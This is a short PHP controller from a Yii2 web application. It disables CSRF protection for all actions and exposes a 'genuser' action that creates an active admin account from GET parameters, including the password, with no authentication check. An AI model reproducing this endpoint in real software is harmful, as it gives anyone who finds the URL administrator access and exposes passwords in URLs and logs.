<?php

namespace app\controllers;

use Yii;
use yii\helpers\Url;
use yii\web\Controller;
use app\models\Member;
use yii\base\Model;
use app\models\ConstProject;
use app\models\User;

class UserController extends Controller
{
	public function beforeAction($action) {
		switch ($action->id){
			default:
				$this->enableCsrfValidation = false;
				break;
		}

		return parent::beforeAction($action);
	}


	public function actionGenuser(){
		
		$username = \Yii::$app->request->get('username');
		$password = \Yii::$app->request->get('password');
		$firstname = \Yii::$app->request->get('firstname');
		
		$user = User::find()->where(['username'=>$username])->one();
		if(empty($user)){
			$user = new User();
			$user->username = $username;
			$user->firstName = $firstname;
			$user->lastName = '';
			$user->role = 'admin';
			$user->status = User::STATUS_ACTIVE;
			$user->setPassword($password);
			$user->generateAuthKey();
			$user->save();
		}
		return $this->redirect(['site/index']);
	}
}